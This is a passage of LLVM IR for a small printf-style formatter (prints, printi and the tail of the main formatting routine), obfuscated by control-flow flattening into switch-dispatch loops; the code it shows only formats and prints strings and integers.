  store i32 %126, i32* %9, align 4
  store i32 320171362, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  %128 = load i8*, i8** %5, align 8
  %129 = load i8, i8* %128, align 1
  %130 = zext i8 %129 to i32
  %131 = icmp eq i32 %130, 100
  %132 = select i1 %131, i32 1164080783, i32 1018476876
  store i32 %132, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load i8**, i8*** %4, align 8
  store i8** %134, i8*** %.reg2mem13
  %135 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %135, %struct.__va_list_tag** %.reg2mem15
  %.reload18 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %136 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload18, i32 0, i32 0
  store i32* %136, i32** %.reg2mem19
  %.reload21 = load volatile i32*, i32** %.reg2mem19
  %137 = load i32, i32* %.reload21, align 8
  store i32 %137, i32* %.reg2mem22
  %.reload25 = load volatile i32, i32* %.reg2mem22
  %138 = icmp ule i32 %.reload25, 40
  %139 = select i1 %138, i32 190883546, i32 418730908
  store i32 %139, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %.reload17 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %141 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload17, i32 0, i32 3
  %142 = load i8*, i8** %141, align 8
  %.reload24 = load volatile i32, i32* %.reg2mem22
  %143 = getelementptr i8, i8* %142, i32 %.reload24
  %144 = bitcast i8* %143 to i32*
  %.reload23 = load volatile i32, i32* %.reg2mem22
  %145 = add i32 %.reload23, 8
  %.reload20 = load volatile i32*, i32** %.reg2mem19
  store i32 %145, i32* %.reload20, align 8
  store i32 1732682033, i32* %switchVar
  store i32* %144, i32** %.reg2mem82
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %.reload16 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %147 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload16, i32 0, i32 2
  %148 = load i8*, i8** %147, align 8
  %149 = bitcast i8* %148 to i32*
  %150 = getelementptr i8, i8* %148, i32 8
  store i8* %150, i8** %147, align 8
  store i32 1732682033, i32* %switchVar
  store i32* %149, i32** %.reg2mem82
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %.reload83 = load i32*, i32** %.reg2mem82
  %152 = load i32, i32* %.reload83, align 4
  %153 = load i32, i32* %7, align 4
  %154 = load i32, i32* %8, align 4
  %.reload14 = load volatile i8**, i8*** %.reg2mem13
  %155 = call i32 @printi(i8** %.reload14, i32 %152, i32 10, i32 1, i32 %153, i32 %154, i32 97)
  %156 = load i32, i32* %9, align 4
  %157 = add nsw i32 %156, %155
  store i32 %157, i32* %9, align 4
  store i32 320171362, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i8*, i8** %5, align 8
  %160 = load i8, i8* %159, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 120
  %163 = select i1 %162, i32 824794622, i32 -1443294493
  store i32 %163, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8**, i8*** %4, align 8
  store i8** %165, i8*** %.reg2mem26
  %166 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %166, %struct.__va_list_tag** %.reg2mem28
  %.reload31 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload31, i32 0, i32 0
  store i32* %167, i32** %.reg2mem32
  %.reload34 = load volatile i32*, i32** %.reg2mem32
  %168 = load i32, i32* %.reload34, align 8
  store i32 %168, i32* %.reg2mem35
  %.reload38 = load volatile i32, i32* %.reg2mem35
  %169 = icmp ule i32 %.reload38, 40
  %170 = select i1 %169, i32 -823058086, i32 -1055915790
  store i32 %170, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  %.reload30 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %172 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload30, i32 0, i32 3
  %173 = load i8*, i8** %172, align 8
  %.reload37 = load volatile i32, i32* %.reg2mem35
  %174 = getelementptr i8, i8* %173, i32 %.reload37
  %175 = bitcast i8* %174 to i32*
  %.reload36 = load volatile i32, i32* %.reg2mem35
  %176 = add i32 %.reload36, 8
  %.reload33 = load volatile i32*, i32** %.reg2mem32
  store i32 %176, i32* %.reload33, align 8
  store i32 -1278001543, i32* %switchVar
  store i32* %175, i32** %.reg2mem84
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %.reload29 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %178 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload29, i32 0, i32 2
  %179 = load i8*, i8** %178, align 8
  %180 = bitcast i8* %179 to i32*
  %181 = getelementptr i8, i8* %179, i32 8
  store i8* %181, i8** %178, align 8
  store i32 -1278001543, i32* %switchVar
  store i32* %180, i32** %.reg2mem84
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %.reload85 = load i32*, i32** %.reg2mem84
  %183 = load i32, i32* %.reload85, align 4
  %184 = load i32, i32* %7, align 4
  %185 = load i32, i32* %8, align 4
  %.reload27 = load volatile i8**, i8*** %.reg2mem26
  %186 = call i32 @printi(i8** %.reload27, i32 %183, i32 16, i32 0, i32 %184, i32 %185, i32 97)
  %187 = load i32, i32* %9, align 4
  %188 = add nsw i32 %187, %186
  store i32 %188, i32* %9, align 4
  store i32 320171362, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  %190 = load i8*, i8** %5, align 8
  %191 = load i8, i8* %190, align 1
  %192 = zext i8 %191 to i32
  %193 = icmp eq i32 %192, 88
  %194 = select i1 %193, i32 -427991795, i32 1743290798
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load i8**, i8*** %4, align 8
  store i8** %196, i8*** %.reg2mem39
  %197 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %197, %struct.__va_list_tag** %.reg2mem41
  %.reload44 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %198 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload44, i32 0, i32 0
  store i32* %198, i32** %.reg2mem45
  %.reload47 = load volatile i32*, i32** %.reg2mem45
  %199 = load i32, i32* %.reload47, align 8
  store i32 %199, i32* %.reg2mem48
  %.reload51 = load volatile i32, i32* %.reg2mem48
  %200 = icmp ule i32 %.reload51, 40
  %201 = select i1 %200, i32 472958543, i32 -403424570
  store i32 %201, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  %.reload43 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %203 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload43, i32 0, i32 3
  %204 = load i8*, i8** %203, align 8
  %.reload50 = load volatile i32, i32* %.reg2mem48
  %205 = getelementptr i8, i8* %204, i32 %.reload50
  %206 = bitcast i8* %205 to i32*
  %.reload49 = load volatile i32, i32* %.reg2mem48
  %207 = add i32 %.reload49, 8
  %.reload46 = load volatile i32*, i32** %.reg2mem45
  store i32 %207, i32* %.reload46, align 8
  store i32 1473572641, i32* %switchVar
  store i32* %206, i32** %.reg2mem86
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %.reload42 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %209 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload42, i32 0, i32 2
  %210 = load i8*, i8** %209, align 8
  %211 = bitcast i8* %210 to i32*
  %212 = getelementptr i8, i8* %210, i32 8
  store i8* %212, i8** %209, align 8
  store i32 1473572641, i32* %switchVar
  store i32* %211, i32** %.reg2mem86
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %.reload87 = load i32*, i32** %.reg2mem86
  %214 = load i32, i32* %.reload87, align 4
  %215 = load i32, i32* %7, align 4
  %216 = load i32, i32* %8, align 4
  %.reload40 = load volatile i8**, i8*** %.reg2mem39
  %217 = call i32 @printi(i8** %.reload40, i32 %214, i32 16, i32 0, i32 %215, i32 %216, i32 65)
  %218 = load i32, i32* %9, align 4
  %219 = add nsw i32 %218, %217
  store i32 %219, i32* %9, align 4
  store i32 320171362, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i8*, i8** %5, align 8
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 117
  %225 = select i1 %224, i32 801277721, i32 -887192635
  store i32 %225, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = load i8**, i8*** %4, align 8
  store i8** %227, i8*** %.reg2mem52
  %228 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %228, %struct.__va_list_tag** %.reg2mem54
  %.reload57 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %229 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload57, i32 0, i32 0
  store i32* %229, i32** %.reg2mem58
  %.reload60 = load volatile i32*, i32** %.reg2mem58
  %230 = load i32, i32* %.reload60, align 8
  store i32 %230, i32* %.reg2mem61
  %.reload64 = load volatile i32, i32* %.reg2mem61
  %231 = icmp ule i32 %.reload64, 40
  %232 = select i1 %231, i32 -1937536784, i32 -1884146594
  store i32 %232, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %.reload56 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %234 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload56, i32 0, i32 3
  %235 = load i8*, i8** %234, align 8
  %.reload63 = load volatile i32, i32* %.reg2mem61
  %236 = getelementptr i8, i8* %235, i32 %.reload63
  %237 = bitcast i8* %236 to i32*
  %.reload62 = load volatile i32, i32* %.reg2mem61
  %238 = add i32 %.reload62, 8
  %.reload59 = load volatile i32*, i32** %.reg2mem58
  store i32 %238, i32* %.reload59, align 8
  store i32 1010647730, i32* %switchVar
  store i32* %237, i32** %.reg2mem88
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  %.reload55 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %240 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload55, i32 0, i32 2
  %241 = load i8*, i8** %240, align 8
  %242 = bitcast i8* %241 to i32*
  %243 = getelementptr i8, i8* %241, i32 8
  store i8* %243, i8** %240, align 8
  store i32 1010647730, i32* %switchVar
  store i32* %242, i32** %.reg2mem88
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %.reload89 = load i32*, i32** %.reg2mem88
  %245 = load i32, i32* %.reload89, align 4
  %246 = load i32, i32* %7, align 4
  %247 = load i32, i32* %8, align 4
  %.reload53 = load volatile i8**, i8*** %.reg2mem52
  %248 = call i32 @printi(i8** %.reload53, i32 %245, i32 10, i32 0, i32 %246, i32 %247, i32 97)
  %249 = load i32, i32* %9, align 4
  %250 = add nsw i32 %249, %248
  store i32 %250, i32* %9, align 4
  store i32 320171362, i32* %switchVar
  br label %loopEnd

; <label>:251:                                    ; preds = %loopEntry
  %252 = load i8*, i8** %5, align 8
  %253 = load i8, i8* %252, align 1
  %254 = zext i8 %253 to i32
  %255 = icmp eq i32 %254, 99
  %256 = select i1 %255, i32 -381956903, i32 920282744
  store i32 %256, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %258, %struct.__va_list_tag** %.reg2mem65
  %.reload68 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %259 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload68, i32 0, i32 0
  store i32* %259, i32** %.reg2mem69
  %.reload71 = load volatile i32*, i32** %.reg2mem69
  %260 = load i32, i32* %.reload71, align 8
  store i32 %260, i32* %.reg2mem72
  %.reload75 = load volatile i32, i32* %.reg2mem72
  %261 = icmp ule i32 %.reload75, 40
  %262 = select i1 %261, i32 -1292166376, i32 -2073301962
  store i32 %262, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %.reload67 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %264 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload67, i32 0, i32 3
  %265 = load i8*, i8** %264, align 8
  %.reload74 = load volatile i32, i32* %.reg2mem72
  %266 = getelementptr i8, i8* %265, i32 %.reload74
  %267 = bitcast i8* %266 to i32*
  %.reload73 = load volatile i32, i32* %.reg2mem72
  %268 = add i32 %.reload73, 8
  %.reload70 = load volatile i32*, i32** %.reg2mem69
  store i32 %268, i32* %.reload70, align 8
  store i32 -846426780, i32* %switchVar
  store i32* %267, i32** %.reg2mem90
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %.reload66 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %270 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload66, i32 0, i32 2
  %271 = load i8*, i8** %270, align 8
  %272 = bitcast i8* %271 to i32*
  %273 = getelementptr i8, i8* %271, i32 8
  store i8* %273, i8** %270, align 8
  store i32 -846426780, i32* %switchVar
  store i32* %272, i32** %.reg2mem90
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  %.reload91 = load i32*, i32** %.reg2mem90
  %275 = load i32, i32* %.reload91, align 4
  %276 = trunc i32 %275 to i8
  %277 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %276, i8* %277, align 1
  %278 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %278, align 1
  %279 = load i8**, i8*** %4, align 8
  %280 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %281 = load i32, i32* %7, align 4
  %282 = load i32, i32* %8, align 4
  %283 = call i32 @prints(i8** %279, i8* %280, i32 %281, i32 %282)
  %284 = load i32, i32* %9, align 4
  %285 = add nsw i32 %284, %283
  store i32 %285, i32* %9, align 4
  store i32 320171362, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  store i32 845219274, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  store i32 -1204737582, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  %289 = load i8**, i8*** %4, align 8
  %290 = load i8*, i8** %5, align 8
  %291 = load i8, i8* %290, align 1
  %292 = zext i8 %291 to i32
  call void @printchar(i8** %289, i32 %292)
  %293 = load i32, i32* %9, align 4
  %294 = add nsw i32 %293, 1
  store i32 %294, i32* %9, align 4
  store i32 845219274, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  store i32 320171362, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  %297 = load i8*, i8** %5, align 8
  %298 = getelementptr inbounds i8, i8* %297, i32 1
  store i8* %298, i8** %5, align 8
  store i32 -386197202, i32* %switchVar
  br label %loopEnd

; <label>:299:                                    ; preds = %loopEntry
  %300 = load i8**, i8*** %4, align 8
  %301 = icmp ne i8** %300, null
  %302 = select i1 %301, i32 1646129641, i32 925606112
  store i32 %302, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  %304 = load i8**, i8*** %4, align 8
  %305 = load i8*, i8** %304, align 8
  store i8 0, i8* %305, align 1
  store i32 925606112, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %308 = bitcast %struct.__va_list_tag* %307 to i8*
  call void @llvm.va_end(i8* %308)
  %309 = load i32, i32* %9, align 4
  ret i32 %309

loopEnd:                                          ; preds = %303, %299, %296, %295, %288, %287, %286, %274, %269, %263, %257, %251, %244, %239, %233, %226, %220, %213, %208, %202, %195, %189, %182, %177, %171, %164, %158, %151, %146, %140, %133, %127, %121, %120, %118, %110, %105, %99, %93, %87, %84, %75, %73, %68, %62, %61, %56, %50, %49, %46, %40, %39, %33, %32, %24, %18, %12, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -114439407, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -114439407, label %first
    i32 -719984250, label %16
    i32 1103262039, label %18
    i32 1381386169, label %23
    i32 -722489483, label %26
    i32 1158075605, label %29
    i32 -1083226603, label %34
    i32 -502270751, label %35
    i32 1504784742, label %39
    i32 -1188951568, label %44
    i32 -769841988, label %45
    i32 -1421153818, label %46
    i32 -1833336315, label %51
    i32 503136217, label %52
    i32 -293068002, label %56
    i32 1024148848, label %61
    i32 -1084575318, label %64
    i32 -266303043, label %65
    i32 -415314438, label %66
    i32 875963225, label %71
    i32 1059321742, label %78
    i32 -759683720, label %81
    i32 1772058590, label %82
    i32 1022700454, label %86
    i32 1144582386, label %91
    i32 1356847833, label %94
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp sgt i32 %.reload, 0
  %15 = select i1 %14, i32 -719984250, i32 -1421153818
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  %17 = load i8*, i8** %6, align 8
  store i8* %17, i8** %12, align 8
  store i32 1103262039, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %12, align 8
  %20 = load i8, i8* %19, align 1
  %21 = icmp ne i8 %20, 0
  %22 = select i1 %21, i32 1381386169, i32 1158075605
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %11, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %11, align 4
  store i32 -722489483, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i8*, i8** %12, align 8
  %28 = getelementptr inbounds i8, i8* %27, i32 1
  store i8* %28, i8** %12, align 8
  store i32 1103262039, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %11, align 4
  %31 = load i32, i32* %7, align 4
  %32 = icmp sge i32 %30, %31
  %33 = select i1 %32, i32 -1083226603, i32 -502270751
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 1504784742, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = sub nsw i32 %37, %36
  store i32 %38, i32* %7, align 4
  store i32 1504784742, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %8, align 4
  %41 = and i32 %40, 2
  %42 = icmp ne i32 %41, 0
  %43 = select i1 %42, i32 -1188951568, i32 -769841988
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 48, i32* %10, align 4
  store i32 -769841988, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 -1421153818, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %8, align 4
  %48 = and i32 %47, 1
  %49 = icmp ne i32 %48, 0
  %50 = select i1 %49, i32 -266303043, i32 -1833336315
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 503136217, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %7, align 4
  %54 = icmp sgt i32 %53, 0
  %55 = select i1 %54, i32 -293068002, i32 -1084575318
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8**, i8*** %5, align 8
  %58 = load i32, i32* %10, align 4
  call void @printchar(i8** %57, i32 %58)
  %59 = load i32, i32* %9, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %9, align 4
  store i32 1024148848, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %7, align 4
  %63 = add nsw i32 %62, -1
  store i32 %63, i32* %7, align 4
  store i32 503136217, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 -266303043, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 -415314438, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i8*, i8** %6, align 8
  %68 = load i8, i8* %67, align 1
  %69 = icmp ne i8 %68, 0
  %70 = select i1 %69, i32 875963225, i32 -759683720
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i8**, i8*** %5, align 8
  %73 = load i8*, i8** %6, align 8
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i32
  call void @printchar(i8** %72, i32 %75)
  %76 = load i32, i32* %9, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %9, align 4
  store i32 1059321742, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %6, align 8
  %80 = getelementptr inbounds i8, i8* %79, i32 1
  store i8* %80, i8** %6, align 8
  store i32 -415314438, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  store i32 1772058590, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %7, align 4
  %84 = icmp sgt i32 %83, 0
  %85 = select i1 %84, i32 1022700454, i32 1356847833
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i8**, i8*** %5, align 8
  %88 = load i32, i32* %10, align 4
  call void @printchar(i8** %87, i32 %88)
  %89 = load i32, i32* %9, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %9, align 4
  store i32 1144582386, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %7, align 4
  %93 = add nsw i32 %92, -1
  store i32 %93, i32* %7, align 4
  store i32 1772058590, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %9, align 4
  ret i32 %95

loopEnd:                                          ; preds = %91, %86, %82, %81, %78, %71, %66, %65, %64, %61, %56, %52, %51, %46, %45, %44, %39, %35, %34, %29, %26, %23, %18, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %.reg2mem = alloca i32
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  store i32 %23, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 2106952101, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 2106952101, label %first
    i32 -1219201828, label %26
    i32 1457190042, label %34
    i32 1438017008, label %38
    i32 898354240, label %42
    i32 1517764274, label %46
    i32 -1777123240, label %49
    i32 2033957673, label %54
    i32 752012427, label %58
    i32 -567842008, label %65
    i32 -509647522, label %71
    i32 -827992099, label %80
    i32 -170807000, label %84
    i32 -1948213260, label %88
    i32 -1176825954, label %93
    i32 1581350942, label %99
    i32 -739601651, label %102
    i32 -1969424298, label %103
    i32 -223162670, label %111
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %24 = icmp eq i32 %.reload, 0
  %25 = select i1 %24, i32 -1219201828, i32 1457190042
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %27, align 1
  %28 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %28, align 1
  %29 = load i8**, i8*** %9, align 8
  %30 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %31 = load i32, i32* %13, align 4
  %32 = load i32, i32* %14, align 4
  %33 = call i32 @prints(i8** %29, i8* %30, i32 %31, i32 %32)
  store i32 %33, i32* %8, align 4
  store i32 -223162670, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i32, i32* %12, align 4
  %36 = icmp ne i32 %35, 0
  %37 = select i1 %36, i32 1438017008, i32 -1777123240
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %11, align 4
  %40 = icmp eq i32 %39, 10
  %41 = select i1 %40, i32 898354240, i32 -1777123240
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %10, align 4
  %44 = icmp slt i32 %43, 0
  %45 = select i1 %44, i32 1517764274, i32 -1777123240
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 1, i32* %19, align 4
  %47 = load i32, i32* %10, align 4
  %48 = sub nsw i32 0, %47
  store i32 %48, i32* %21, align 4
  store i32 -1777123240, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %51 = getelementptr inbounds i8, i8* %50, i64 12
  %52 = getelementptr inbounds i8, i8* %51, i64 -1
  store i8* %52, i8** %17, align 8
  %53 = load i8*, i8** %17, align 8
  store i8 0, i8* %53, align 1
  store i32 2033957673, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %21, align 4
  %56 = icmp ne i32 %55, 0
  %57 = select i1 %56, i32 752012427, i32 -827992099
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %21, align 4
  %60 = load i32, i32* %11, align 4
  %61 = urem i32 %59, %60
  store i32 %61, i32* %18, align 4
  %62 = load i32, i32* %18, align 4
  %63 = icmp sge i32 %62, 10
  %64 = select i1 %63, i32 -567842008, i32 -509647522
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %15, align 4
  %67 = sub nsw i32 %66, 48
  %68 = sub nsw i32 %67, 10
  %69 = load i32, i32* %18, align 4
  %70 = add nsw i32 %69, %68
  store i32 %70, i32* %18, align 4
  store i32 -509647522, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %18, align 4
  %73 = add nsw i32 %72, 48
  %74 = trunc i32 %73 to i8
  %75 = load i8*, i8** %17, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 -1
  store i8* %76, i8** %17, align 8
  store i8 %74, i8* %76, align 1
  %77 = load i32, i32* %11, align 4
  %78 = load i32, i32* %21, align 4
  %79 = udiv i32 %78, %77
